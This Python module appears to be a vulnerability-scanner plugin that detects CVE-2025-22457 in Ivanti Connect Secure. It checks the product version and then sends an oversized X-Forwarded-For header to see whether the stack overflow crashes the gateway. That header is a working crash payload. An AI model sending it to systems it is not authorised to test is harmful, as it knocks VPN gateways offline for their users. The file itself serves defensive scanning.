"""Agent Asteroid implementation for CVE-2025-22457"""

import datetime
import logging
import re
import time
import requests
from packaging import version

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Ivanti Stack-based Buffer Overflow"
VULNERABILITY_REFERENCE = "CVE-2025-22457"
VULNERABILITY_DESCRIPTION = """
A stack-based buffer overflow in Ivanti Connect Secure before version 22.7R2.6, 
Ivanti Policy Secure before version 22.7R1.4, and Ivanti ZTA Gateways before version 22.8R2.2 
allows a remote unauthenticated attacker to achieve remote code execution.
"""
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
VERSION_PATTERN = re.compile(r'<PARAM NAME="ProductVersion"\s+VALUE="([0-9.]+)')
ENDPOINT = "/dana-na/auth/url_admin/welcome.cgi?type=inter"
PAYLOAD_HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "1" * 2048,
}

def _grab_version_info(target: definitions.Target) -> str | None:
    """Get the product version from the target."""
    try:
        resp = requests.get(
            f"{target.origin}{ENDPOINT}",
            verify=False,
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        if resp.status_code == 200:
            match = VERSION_PATTERN.search(resp.text)
            if match:
                return match.group(1)
    except requests_exceptions.RequestException:
        logging.error("Version check failed for %s", target.origin)
    return None

def _is_vulnerable_version(ver_str: str) -> bool:
    """Check if the version is vulnerable."""
    try:
        parsed_ver = version.parse(ver_str)
        # Check if version is below patched versions
        if parsed_ver < version.parse("22.7R2.6"):
            return True
    except version.InvalidVersion:
        logging.error("Could not parse version string: %s", ver_str)
    return False

def _check_crash(target: definitions.Target) -> bool:
    """Check if target crashes with crafted payload."""
    try:
        # Step 1: Send payload
        resp = requests.post(
            target.origin,
            headers=PAYLOAD_HEADERS,
            verify=False,
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        # If we get a response, it's not vulnerable
        if resp:
            return False
        
        # Step 2: Wait and send follow-up GET
        time.sleep(1)
        resp = requests.get(
            target.origin,
            verify=False,
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        # If we get 200 after crash attempt, it's vulnerable
        if resp and resp.status_code == 200:
            return True
    except requests_exceptions.RequestException:
        # Connection error likely indicates crash
        return True
    return False
@exploits_registry.register
class IvantiConnectSecureExploit(webexploit.WebExploit):
    """
    CVE-2025-22457: Ivanti Connect Secure Buffer Overflow
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """Check if target is an Ivanti Connect Secure instance."""
        version = _grab_version_info(target)
        if version:
            return _is_vulnerable_version(version)
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Check if target is vulnerable to buffer overflow."""
        vulnerabilities: list[definitions.Vulnerability] = []
        
        if self.accept(target) and _check_crash(target):
            vulnerabilities.append(self.create_vulnerability(target))
            
        return vulnerabilities
